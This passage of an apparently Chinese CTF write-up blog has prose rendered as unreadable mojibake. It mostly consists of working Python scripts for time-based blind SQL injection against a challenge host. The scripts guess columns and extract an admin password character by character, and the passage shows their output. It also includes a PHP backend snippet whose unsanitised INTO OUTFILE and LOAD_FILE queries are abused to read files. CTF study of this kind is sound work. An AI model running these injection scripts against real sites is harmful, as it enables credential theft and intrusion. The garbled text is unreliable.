class="line">print(&quot;-&quot; * 50)</span><br><span class="line">print(f&quot;[SUCCESS] æœ€ç»ˆæ•°æ®åº“å: &#123;db_name&#125;&quot;)</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªè„šæœ¬æœ€åè·‘å‡ºæ¥ctfï¼Œè¯´æ˜æ•°æ®åº“çš„åå­—å°±æ˜¯ctfï¼Œä½†æ¥ä¸‹æ¥åˆäº§ç”Ÿå¾ˆå°´å°¬çš„äº‹æƒ…äº†ï¼Œæ­£å¸¸å¾—åˆ°æ•°æ®åº“ååè¦åˆ©ç”¨selectä»æ•°æ®åº“é‡Œé¢æŸ¥è¯¢ä¸œè¥¿ï¼Œä½†ä¸€å¼€å§‹å°±å·²ç»æµ‹è¯•åˆ°ï¼Œselectæ˜¯åœ¨é¢˜ç›®é»‘åå•çš„é‡Œé¢ï¼Œæ‰€ä»¥ï¼Œæœ‰è¿™ä¸ªæ•°æ®åº“åæ˜¯ç”¨ä¸åˆ°çš„ï¼Œæˆ‘ä»¬è¦åšçš„åº”è¯¥æ˜¯ç›´æ¥é€šè¿‡çŒœæµ‹ï¼Œçˆ†ç ´è¡¨åå­—ï¼Œå¹¶ä»è¡¨ä¸­çˆ†ç ´å‡ºæ•°æ®æ¥ã€‚</p>
<p>è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = &quot;http://18f25160-98b8-4fbe-b4b0-b55ffc1c6886.ctf.g0dsec.com/check.php&quot;</span><br><span class="line"># å¸¸è§åˆ—åå­—å…¸</span><br><span class="line">columns = [&#x27;passwd&#x27;, &#x27;id&#x27;, &#x27;username&#x27;, &#x27;flag&#x27;, &#x27;password&#x27;, &#x27;admin&#x27;]</span><br><span class="line"></span><br><span class="line">print(&quot;[*] æ­£åœ¨åˆ©ç”¨ No-Select é€»è¾‘çˆ†ç ´åˆ—å...&quot;)</span><br><span class="line">print(&quot;[*] åŸç†: nonexistent&#x27; || (sleep(2.5 * (col=col))) #&quot;)</span><br><span class="line"></span><br><span class="line">for col in columns:</span><br><span class="line">    # Payload é€»è¾‘:</span><br><span class="line">    # å¦‚æœåˆ—å­˜åœ¨: col=col ä¸ºçœŸ(1) -&gt; sleep(2.5 * 1) -&gt; å»¶è¿Ÿ</span><br><span class="line">    # å¦‚æœåˆ—ä¸å­˜åœ¨: æŠ¥é”™ -&gt; sleep ä¸æ‰§è¡Œ -&gt; æ— å»¶è¿Ÿ</span><br><span class="line">    payload = f&quot;nonexistent&#x27;||(sleep(2.5*(&#123;col&#125;=&#123;col&#125;)))#&quot;</span><br><span class="line">    </span><br><span class="line">    data = &#123;&quot;user&quot;: payload, &quot;passwd&quot;: &quot;1&quot;&#125;</span><br><span class="line">    </span><br><span class="line">    try:</span><br><span class="line">        requests.post(url, data=data, timeout=2)</span><br><span class="line">    except requests.exceptions.ReadTimeout:</span><br><span class="line">        print(f&quot;[+] å‘ç°å­˜åœ¨åˆ—å: &#123;col&#125;&quot;)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>

<p>ä¹‹æ‰€ä»¥ä¸å»çœ‹è¡¨ï¼Œæ˜¯å› ä¸ºæ²¡å¿…è¦äº†ï¼Œæˆ‘ä»¬ç›®å‰å°±å·²ç»åœ¨æŸä¸ªè¡¨é‡Œäº†ï¼Œç®¡ä»–æ˜¯ä»€ä¹ˆï¼Œé™¤éå½“å‰è¡¨é‡Œæ²¡æ•°æ®ï¼Œåœ¨è€ƒè™‘å…¶ä»–çš„ã€‚</p>
<p>è¿è¡Œè„šæœ¬åå‘ç°ï¼Œå½“å‰è¡¨æ˜ä¸ºadminï¼Œå­˜åœ¨ä¸¤ä¸ªåˆ—ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(base) PS C:\Users\G1731\Downloads&gt; &amp; C:/Users/G1731/anaconda3/python.exe c:/Users/G1731/Downloads/2.py</span><br><span class="line">[*] æ­£åœ¨åˆ©ç”¨ No-Select é€»è¾‘çˆ†ç ´åˆ—å...</span><br><span class="line">[*] åŸç†: nonexistent&#x27; || (sleep(2.5 * (col=col))) #</span><br><span class="line">[+] å‘ç°å­˜åœ¨åˆ—å: passwd</span><br><span class="line">[+] å‘ç°å­˜åœ¨åˆ—å: id</span><br></pre></td></tr></table></figure>

<p>ç”¨è„šæœ¬ä¸€ä¸ªä¸€ä¸ªå­—ç¬¦çš„çœ‹åˆ—å†…æ•°æ®ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import urllib3</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line"># ç¦ç”¨ SSL è­¦å‘Š</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"># === é…ç½®åŒºåŸŸ ===</span><br><span class="line">URL = &quot;http://18f25160-98b8-4fbe-b4b0-b55ffc1c6886.ctf.g0dsec.com/check.php&quot;</span><br><span class="line">SLEEP_TIME = 2.0        # æ³¨å…¥å»¶æ—¶æ—¶é—´</span><br><span class="line">TIMEOUT_SETTING = 1.5   # è¯·æ±‚è¶…æ—¶æ—¶é—´ (å¿…é¡»å°äº SLEEP_TIME)</span><br><span class="line"></span><br><span class="line"># å­—ç¬¦é›†ï¼šåŒ…å«å­—æ¯ã€æ•°å­—ã€æ ‡ç‚¹ç¬¦å·</span><br><span class="line">CHARS = string.ascii_letters + string.digits + string.punctuation</span><br><span class="line"></span><br><span class="line">def check_condition(condition_sql):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    å‘é€ Payload åˆ¤æ–­æ¡ä»¶æ˜¯å¦ä¸ºçœŸ</span><br><span class="line">    åŸç†: nonexistent&#x27; || (sleep(SLEEP_TIME * (æ¡ä»¶))) #</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    payload = f&quot;nonexistent&#x27;||(sleep(&#123;SLEEP_TIME&#125;*(&#123;condition_sql&#125;)))#&quot;</span><br><span class="line">    data = &#123;&quot;user&quot;: payload, &quot;passwd&quot;: &quot;1&quot;&#125;</span><br><span class="line">    </span><br><span class="line">    try:</span><br><span class="line">        # å‘é€è¯·æ±‚</span><br><span class="line">        requests.post(URL, data=data, timeout=TIMEOUT_SETTING)</span><br><span class="line">        # å¦‚æœæ²¡æœ‰è¶…æ—¶ï¼Œè¯´æ˜ sleep æ²¡æ‰§è¡Œ -&gt; æ¡ä»¶ä¸ºå‡</span><br><span class="line">        return False</span><br><span class="line">    except requests.exceptions.ReadTimeout:</span><br><span class="line">        # å¦‚æœè¶…æ—¶ï¼Œè¯´æ˜ sleep æ‰§è¡Œäº† -&gt; æ¡ä»¶ä¸ºçœŸ</span><br><span class="line">        return True</span><br><span class="line">    except Exception:</span><br><span class="line">        # ç½‘ç»œé”™è¯¯ç­‰æƒ…å†µé»˜è®¤è¿”å› False</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">def extract_data(target_id, column_name, max_len=60):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    é’ˆå¯¹ç‰¹å®š ID å’Œ åˆ—å æå–æ•°æ®</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    result = &quot;&quot;</span><br><span class="line">    print(f&quot;    [+] æ­£åœ¨æå– ID=&#123;target_id&#125; çš„ &#123;column_name&#125; ...&quot;)</span><br><span class="line">    </span><br><span class="line">    for i in range(1, max_len + 1):</span><br><span class="line">        found_char = False</span><br><span class="line">        for char in CHARS:</span><br><span class="line">            char_ord = ord(char)</span><br><span class="line">            # æ ¸å¿ƒ Payload: (id=target_id) * (ascii(substr(col,i,1))=char)</span><br><span class="line">            condition = f&quot;(id=&#123;target_id&#125;)*(ascii(substr(&#123;column_name&#125;,&#123;i&#125;,1))=&#123;char_ord&#125;)&quot;</span><br><span class="line">            </span><br><span class="line">            if check_condition(condition):</span><br><span class="line">                result += char</span><br><span class="line">                print(f&quot;        [&gt;] è¿›åº¦: &#123;result&#125;&quot;, end=&#x27;\r&#x27;)</span><br><span class="line">                found_char = True</span><br><span class="line">                break</span><br><span class="line">        </span><br><span class="line">        if not found_char:</span><br><span class="line">            break # è¿™ä¸€ä½æ²¡åŒ¹é…åˆ°å­—ç¬¦ï¼Œè¯´æ˜æ•°æ®ç»“æŸ</span><br><span class="line">            </span><br><span class="line">    print(f&quot;\n    [OK] &#123;column_name&#125;: &#123;result&#125;&quot;)</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line"># === ä¸»ç¨‹åº ===</span><br><span class="line">def main():</span><br><span class="line">    print(&quot;[*] å¼€å§‹æ‰§è¡Œ SQL ç›²æ³¨å…¨é‡æå–è„šæœ¬...&quot;)</span><br><span class="line">    print(f&quot;[*] ç›®æ ‡ URL: &#123;URL&#125;&quot;)</span><br><span class="line">    print(&quot;-&quot; * 50)</span><br><span class="line"></span><br><span class="line">    # --- é˜¶æ®µ 1: ç¡®å®šç”¨æˆ·ååˆ—å ---</span><br><span class="line">    print(&quot;[1] æ­£åœ¨æ¢æµ‹å­˜æ”¾ç”¨æˆ·åçš„åˆ—å...&quot;)</span><br><span class="line">    possible_cols = [&#x27;user&#x27;, &#x27;username&#x27;, &#x27;name&#x27;, &#x27;account&#x27;, &#x27;admin_user&#x27;, &#x27;login_id&#x27;]</span><br><span class="line">    username_col = &quot;user&quot; # é»˜è®¤å€¼ï¼Œé˜²è·‘ä¸å‡ºæ¥</span><br><span class="line">    </span><br><span class="line">    for col in possible_cols:</span><br><span class="line">        # æ¢æµ‹åˆ—æ˜¯å¦å­˜åœ¨: col=col</span><br><span class="line">        if check_condition(f&quot;&#123;col&#125;=&#123;col&#125;&quot;):</span><br><span class="line">            print(f&quot;[+] æˆåŠŸå®šä½ç”¨æˆ·ååˆ—: &#123;col&#125;&quot;)</span><br><span class="line">            username_col = col</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;[-] æœªåœ¨å­—å…¸ä¸­æ‰¾åˆ°ç‰¹å®šåˆ—åï¼Œå°†ä½¿ç”¨é»˜è®¤å€¼ &#x27;user&#x27; ç»§ç»­å°è¯•ã€‚&quot;)</span><br><span class="line"></span><br><span class="line">    print(&quot;-&quot; * 50)</span><br><span class="line"></span><br><span class="line">    # --- é˜¶æ®µ 2: éå† ID å¹¶æå–æ•°æ® ---</span><br><span class="line">    print(&quot;[2] å¼€å§‹éå† ID (0-5) å¹¶æå–å‡­è¯...&quot;)</span><br><span class="line">    </span><br><span class="line">    for user_id in range(0, 6):</span><br><span class="line">        # å¿«é€Ÿæ¢æµ‹ ID æ˜¯å¦å­˜åœ¨</span><br><span class="line">        if not check_condition(f&quot;id=&#123;user_id&#125;&quot;):</span><br><span class="line">            print(f&quot;[-] ID=&#123;user_id&#125; ä¸å­˜åœ¨&quot;)</span><br><span class="line">            continue</span><br><span class="line">            </span><br><span class="line">        print(f&quot;[!] å‘ç°æœ‰æ•ˆè´¦æˆ· ID=&#123;user_id&#125;&quot;)</span><br><span class="line">        </span><br><span class="line">        # æå–ç”¨æˆ·å</span><br><span class="line">        username = extract_data(user_id, username_col, max_len=20)</span><br><span class="line">        </span><br><span class="line">        # æå–å¯†ç  (åˆ—åå›ºå®šä¸º passwdï¼Œä¹‹å‰å·²éªŒè¯)</span><br><span class="line">        password = extract_data(user_id, &quot;passwd&quot;, max_len=60)</span><br><span class="line">        </span><br><span class="line">        print(f&quot;\n[SUCCESS] è´¦æˆ·è·å–æˆåŠŸ -&gt; ID: &#123;user_id&#125; | User: &#123;username&#125; | Pass: &#123;password&#125;&quot;)</span><br><span class="line">        print(&quot;-&quot; * 30)</span><br><span class="line"></span><br><span class="line">    print(&quot;[*] æ‰€æœ‰ä»»åŠ¡ç»“æŸã€‚&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>æœ€åå°±å¾—åˆ°äº†è¿™æ ·çš„ç»“æœï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">(base) PS C:\Users\G1731\Downloads&gt; &amp; C:/Users/G1731/anaconda3/python.exe c:/Users/G1731/Downloads/2.py</span><br><span class="line">[*] å¼€å§‹æ‰§è¡Œ SQL ç›²æ³¨å…¨é‡æå–è„šæœ¬...</span><br><span class="line">[*] ç›®æ ‡ URL: http://18f25160-98b8-4fbe-b4b0-b55ffc1c6886.ctf.g0dsec.com/check.php</span><br><span class="line">--------------------------------------------------</span><br><span class="line">[1] æ­£åœ¨æ¢æµ‹å­˜æ”¾ç”¨æˆ·åçš„åˆ—å...</span><br><span class="line">[+] æˆåŠŸå®šä½ç”¨æˆ·ååˆ—: user</span><br><span class="line">--------------------------------------------------</span><br><span class="line">[2] å¼€å§‹éå† ID (0-5) å¹¶æå–å‡­è¯...</span><br><span class="line">[!] å‘ç°æœ‰æ•ˆè´¦æˆ· ID=0</span><br><span class="line">    [+] æ­£åœ¨æå– ID=0 çš„ user ...</span><br><span class="line">        [&gt;] è¿›åº¦: admin</span><br><span class="line">    [OK] user: admin</span><br><span class="line">    [+] æ­£åœ¨æå– ID=0 çš„ passwd ...</span><br><span class="line">        [&gt;] è¿›åº¦: 60D53cP455w0rd</span><br><span class="line">    [OK] passwd: 60D53cP455w0rd</span><br><span class="line"></span><br><span class="line">[SUCCESS] è´¦æˆ·è·å–æˆåŠŸ -&gt; ID: 0 | User: admin | Pass: 60D53cP455w0rd</span><br><span class="line">------------------------------</span><br><span class="line">[-] ID=1 ä¸å­˜åœ¨</span><br><span class="line">[-] ID=2 ä¸å­˜åœ¨</span><br><span class="line">[-] ID=3 ä¸å­˜åœ¨</span><br><span class="line">[-] ID=4 ä¸å­˜åœ¨</span><br><span class="line">[-] ID=5 ä¸å­˜åœ¨</span><br><span class="line">[*] æ‰€æœ‰ä»»åŠ¡ç»“æŸã€‚</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°è´¦å·å¯†ç åï¼Œåœ¨å»ç™»å…¥ï¼Œå°±æˆåŠŸäº†ã€‚</p>
<p><img src="/images/QQ20260102-140332.png" alt="alt text"></p>
<p>æç¤ºå»è®¿é—®è¿™ä¸ªé¡µé¢ï¼Œç»™äº†ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œæ˜¯åå°çš„ä¸€éƒ¨åˆ†æºç ã€‚</p>
<p>ç›®æ ‡ç‚¹åœ¨è¿™ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">if (!isset($_SESSION[&#x27;username&#x27;])) &#123;</span><br><span class="line">    echo &quot;æ‚¨æ²¡æœ‰æƒé™è®¿é—®æ­¤é¡µé¢, 3ç§’åè‡ªåŠ¨è·³è½¬è‡³ä¸»é¡µé¢&quot;;</span><br><span class="line">    echo &quot;&lt;script&gt;setTimeout(function()&#123; window.location.href = &#x27;index.html&#x27;; &#125;, 3000);&lt;/script&gt;&quot;;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">include &quot;database.php&quot;;</span><br><span class="line">$data = new Mysql();</span><br><span class="line">$s = $_POST[&#x27;s&#x27;];</span><br><span class="line">$d = $_POST[&#x27;d&#x27;];</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;operate&#x27;]))&#123;</span><br><span class="line">    switch ($_GET[&#x27;operate&#x27;]) &#123;</span><br><span class="line">        case &quot;into&quot;:</span><br><span class="line">            $sql = &quot;SELECT &#x27;$s&#x27; INTO OUTFILE &#x27;$d&#x27;&quot;;</span><br><span class="line">            $data-&gt;query($sql);</span><br><span class="line">            break;</span><br><span class="line">        case &quot;load&quot;:</span><br><span class="line">            $sql = &quot;SELECT LOAD_FILE(&#x27;$d&#x27;)&quot;;</span><br><span class="line">            echo mysqli_fetch_array($data-&gt;query($sql))[0];</span><br><span class="line">            break;</span><br><span class="line">        default:</span><br><span class="line">            echo &quot;It&#x27;s not allowed&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™è¾¹å­˜åœ¨ä¸€ä¸ªå½“æˆ‘ä»¬ä»¥æ­£ç¡®çš„ç”¨æˆ·å¯†ç ç™»å…¥åå°†è·å¾—ç›´æ¥è¯»å–æ–‡ä»¶çš„æ¼æ´ç‚¹ã€‚</p>
<p>æ‰€ä»¥ç›´æ¥åˆ©ç”¨bpå®Œæˆï¼Œæ“ä½œã€‚</p>
<p>ç„¶åè·å¾—flagã€‚</p>
<p><strong>G0D{90825d5e-416b-41c7-8544-37a99bc9fba5}</strong></p>
<hr>
<p>ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡ç”±ç™½ç™½æ¯›æ¯›åˆ›ä½œï¼Œè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p>

        </div>
    </article>
</div>

</div>

<script src="/js/main.js?v=1767442695293"></script>
</body>
</html>
